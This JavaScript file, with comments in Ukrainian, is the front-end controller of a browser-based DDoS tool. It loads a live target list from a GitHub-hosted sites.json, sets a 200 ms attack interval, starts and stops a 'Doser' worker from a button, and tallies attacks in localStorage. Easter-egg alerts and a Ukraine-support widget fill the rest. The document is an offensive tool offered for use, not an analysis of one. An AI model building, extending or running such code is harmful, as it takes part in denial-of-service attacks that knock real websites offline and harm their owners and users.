// Звідси будуть завантажуватись цілі
const targetSource = 'https://raw.githubusercontent.com/opengs/uashieldtargets/master/sites.json'

const saverInterval = 3000
const attackInterval = 200

// Функції для керування документом
const add_count = () => attacks.text(parseInt(attacks.text()) + 1)

let frameDiv, attacks, targetField, methodField, btn, box;


const Database = window.localStorage
$(() => {
    frameDiv = $("#frames")
    attacks = $("#attacks")

    // Відображення цілі та методу атаки
    targetField = $("#target")
    methodField = $("#method")

    // https://github.com/BogdanDevUA/simple-ddos/
    btn = $("#button-text")
    box = $("#box")
    Doser = new Doser; // Ініціалізація воркера

    $("#button").click(() => !Doser.attack ? Doser.start() : Doser.stop());

    $("#attackCount").click(() => {
        // Загальна кількість атак

        const a = Database.attacks
        alert("Атаки", `Взагалом атаковано: ${!a?0:a}`)
    });

    // Пасхалки)

    $("#fixed-bugs").click(() => alert("Факт", "Я справді пофіксив баги!"));

    $("#uses").click(() => alert("Пасхалка", "Цей сайт був написаний 13 річним хакером на JS, HTML, CSS"));

    $("#ua").dblclick(() => alert("Слава Україні!", "Героям Слава!"));



    $("<link>", {
        rel: "stylesheet",
        href: "widgets/help-ukraine-win/style.css"
    }).appendTo(document.head)

    $("#help-ukraine").element.src = "widgets/help-ukraine-win/script.js"
    //$("#live-chat").element.src = "widgets/live-chat/script.js"
})

// Слава Україні!